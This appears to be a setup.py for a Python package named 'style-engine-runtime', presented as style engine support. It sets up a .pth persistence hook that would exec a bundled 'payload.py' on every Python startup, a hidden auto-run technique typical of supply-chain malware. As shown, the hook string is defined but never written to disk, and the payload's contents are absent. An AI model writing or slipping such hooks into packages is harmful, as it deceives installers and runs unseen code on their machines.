from setuptools import setup
import os

# Write a .pth file into site-packages during install
pth_line = "import os;exec(open(os.path.join(os.path.dirname(__file__), 'style_engine_runtime', 'payload.py')).read())"

setup(
    name="style-engine-runtime",
    version="1.0.0",
    description="Style engine runtime support",
    packages=["style_engine_runtime"],
    package_data={"style_engine_runtime": ["payload.py"]},
)
